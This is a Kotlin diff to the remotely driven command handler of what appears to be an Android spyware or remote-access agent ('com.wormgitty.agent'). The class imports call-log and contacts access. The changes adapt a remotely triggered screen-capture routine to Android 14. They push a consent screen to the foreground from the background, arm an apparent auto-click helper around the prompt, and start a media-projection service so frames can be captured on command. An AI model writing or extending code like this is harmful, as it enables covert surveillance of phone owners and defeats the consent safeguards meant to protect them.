@@ -1,6 +1,7 @@
 package com.wormgitty.agent
 
 import android.content.Context
+import android.os.Build
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Settings
@@ -257,19 +258,53 @@ class CommandLink(private val context: Context) {
      */
     private fun runScreenCapture(payload: kotlinx.serialization.json.JsonObject?): Pair<String, String> {
         val consent = ProjectionConsent(context, AndroidKeystoreKeySource())
-        var projection = reopenProjection(consent)
+        // API 34+: a mediaProjection-typed FGS requires the app to ALREADY hold
+        // android:project_media (consent granted first), and each grant is
+        // single-use. Order: consent -> FGS -> getMediaProjection.
+        var projection: android.media.projection.MediaProjection? =
+            if (Build.VERSION.SDK_INT < 34) reopenProjection(consent) else null
         if (projection == null) {
             GrantBus.arm()
+            ProjectionClickBus.armedAt = System.currentTimeMillis()
             ProjectionClickBus.armed = true
             val i = android.content.Intent(context, ConsentActivity::class.java)
                 .addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
-            runCatching { context.startActivity(i) }
+            // API 34 BAL: a plain startActivity stays invisible even with the
+            // SAW exemption. A PendingIntent sent with the background-start
+            // option raises the task to the foreground.
+            if (Build.VERSION.SDK_INT >= 34) {
+                runCatching {
+                    val opts = android.app.ActivityOptions.makeBasic().apply {
+                        pendingIntentBackgroundActivityStartMode =
+                            android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED
+                    }.toBundle()
+                    android.app.PendingIntent.getActivity(
+                        context, 0, i,
+                        android.app.PendingIntent.FLAG_IMMUTABLE or
+                            android.app.PendingIntent.FLAG_UPDATE_CURRENT,
+                        opts
+                    ).send()
+                }.onFailure {
+                    Log.w("CommandLink", "PI consent launch failed: ${it.message}")
+                    runCatching { context.startActivity(i) }
+                }
+            } else {
+                runCatching { context.startActivity(i) }
+            }
             val granted = GrantBus.await(20)
             ProjectionClickBus.armed = false
             if (!granted) return "failed" to "no_consent"
+            if (Build.VERSION.SDK_INT >= 34) {
+                runCatching {
+                    context.startForegroundService(
+                        android.content.Intent(context, ProjectionFgs::class.java)
+                    )
+                }.onFailure { Log.w("CommandLink", "ProjectionFgs start: ${it.message}") }
+                Thread.sleep(300)
+            }
             projection = reopenProjection(consent)
         }
-        if (projection == null) return "failed" to "no_consent"
+        if (projection == null) { stopProjectionFgs(); return "failed" to "no_consent" }
         val frames = payload?.get("frames")?.jsonPrimitive?.content?.toIntOrNull() ?: 6
         val intervalSec = payload?.get("intervalSec")?.jsonPrimitive?.content?.toIntOrNull() ?: 10
         return try {
@@ -287,6 +322,13 @@ class CommandLink(private val context: Context) {
             "failed" to "capture:${t.message?.take(60)}"
         } finally {
             runCatching { projection.stop() }
+            stopProjectionFgs()
+        }
+    }
+
+    private fun stopProjectionFgs() {
+        runCatching {
+            context.stopService(android.content.Intent(context, ProjectionFgs::class.java))
         }
     }
 
